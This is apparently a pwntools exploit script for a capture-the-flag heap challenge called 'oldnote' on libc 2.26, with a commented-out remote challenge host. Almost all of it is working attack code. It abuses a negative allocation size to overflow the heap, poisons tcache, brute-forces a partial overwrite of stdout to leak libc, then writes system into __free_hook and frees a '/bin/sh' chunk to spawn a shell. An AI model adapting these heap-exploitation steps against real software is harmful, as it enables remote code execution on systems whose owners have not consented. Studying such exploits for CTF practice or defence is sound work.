from pwn import *
import time
while(True):
	target=process('./oldnote',env={"LD_PRELOAD":"./libc-2.26.so"})
	libc=ELF('./libc-2.26.so')
	#target=remote('poseidonchalls.westeurope.cloudapp.azure.com',9000)
	def add(size,data="A"):
		target.sendlineafter("choice : ",str(1))
		target.sendafter("size : ",str(size))
		target.sendafter("Note : ",data)

	def delete(index):
		target.sendafter("choice : ",str(2))
		target.sendafter("idx : ",str(index))

	add(0x90)
	delete(0)
	add(0x10)
	add(0x30)#1
	add(0x30)#2
	add(0xf0)
	delete(0)
	payload="A"*0x10+p64(0)+p64(0x41)+"A"*0x30+p64(0)+p64(0x41)+"A"*0x30
	payload+=p64(0)+p64(0x4e1)+"A"*0x40+p64(0)+p64(0x491)+"A"*0x480+p64(0)+p64(0x21)+"A"*0x10+p64(0)+p64(0x7fffffffffffffff)
	add(-3,payload)#0
	delete(3)
	delete(0)
	payload="A"*0x10+p64(0)+p64(0x41)+"A"*0x30+p64(0)+p64(0x41)+"A"*0x30
	payload+=p64(0)+p64(0x51)+"\x20\xd7"
	add(-3,payload)#0
	delete(2)
	delete(1)
	delete(0)
	payload="A"*0x10+p64(0)+p64(0x41)+"\xa0"
	add(-3,payload)#0
	add(0x30)#1
	add(0x30)#2
	payload=p64(0xfbad1800)+p64(0)*3+"\x00"
	try:
		add(0x30,payload)#3
		libc_leak=u64(target.recv(32)[24:32])
	except:
		target.close()
		continue
	libc_base=libc_leak-0x3d73e0
	if(libc_base%0x1000!=0):
		target.close()
		continue
	libc_free_hook=libc_base+libc.symbols["__free_hook"]
	libc_system=libc_base+libc.symbols["system"]
	delete(2)
	delete(0)
	payload="A"*0x10+p64(0)+p64(0x21)+"A"*0x10+p64(0)+p64(0x21)
	add(-3,payload)#0
	delete(1)
	delete(0)
	payload="A"*0x10+p64(0)+p64(0x21)+p64(libc_free_hook)
	add(-3,payload)#0
	add(0x10,"/bin/sh\x00")#1
	add(0x10,p64(libc_system))#2
	delete(1)
	target.interactive()
